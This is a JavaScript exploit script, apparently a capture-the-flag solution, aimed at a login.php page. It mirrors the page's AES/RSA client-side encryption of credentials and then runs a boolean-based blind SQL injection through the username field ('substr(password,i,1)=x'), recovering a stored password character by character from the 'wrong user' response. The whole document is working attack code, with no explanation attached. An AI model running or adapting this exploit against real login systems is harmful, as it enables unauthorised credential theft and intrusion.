function randomPassword(size)
{
  var seed = new Array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','P','Q','R','S','T','U','V','W','X','Y','Z',
  'a','b','c','d','e','f','g','h','i','j','k','m','n','p','Q','r','s','t','u','v','w','x','y','z',
  '2','3','4','5','6','7','8','9'
  );
  seedlength = seed.length;
  var createPassword = '';
  for (i=0;i<size;i++) {
    j = Math.floor(Math.random()*seedlength);
    createPassword += seed[j];
  }
  return createPassword;
}


function encode(username, password){
    var a = randomPassword(16);
    var key = CryptoJS.enc.Latin1.parse(a);        
    var iv =    CryptoJS.enc.Latin1.parse('1234567890123456');            
    var data1 = username;     
    var encrypted1 = CryptoJS.AES.encrypt(data1, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.ZeroPadding });
    var data2 = password;
    var encrypted2 = CryptoJS.AES.encrypt(data2, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.ZeroPadding });

    $('#username').val(encrypted1);
    $('#password').val(encrypted2);
    var password = $('#password').val();
    var username = $('#username').val();

    var rsa = new RSAKey();
    var modulus = "CDB41B014C244A55CEC3E9D222B22C8A05A7DD7DF8A419A2A9C08E91DF725A1FD4C09777F36D394701C5DB97CCFC52FFBD5A90329295F5CEBBB89986BAAFAE4FE58A1F3ECFC39A7B960F5697632CE9D2FAA787F36D9CF5F4FE59DBB52E0554CC4B510D87AB72EB80D36A61E8B9AD00F37720578986E5F17AB0387754566F4E2B";
    var exponent = "010001";
    rsa.setPublic(modulus, exponent);
    var res = rsa.encrypt(a);  

    return [username, password, res]

}
// wrong password
// wrong user
var password = '';
var strings = 'abcdefghijklmnopqrstuvwxyz0123456789';

function get_password(i, j) {
    if(i > 32 || j > 36) return;
    var x =  strings[j];
    var username = "' ^ (substr(password," + i +",1)='" +x+"') ^ '1";
    res = encode(username, 'admin');
    $.ajax({ 
      type:"post", 
      url:"login.php", 
      data: {username:res[0], password:res[1], code:res[2]}, 
      dataType: 'text', 
      async : false,
      success:function(result){ 
        if(result == 'wrong user') {
          // console.log(result);
          get_password(i, ++j);
        } else {
          password += x;
          console.log(password);
          get_password(++i, 0);
        }
      } 
    });
}
get_password(1, 0);
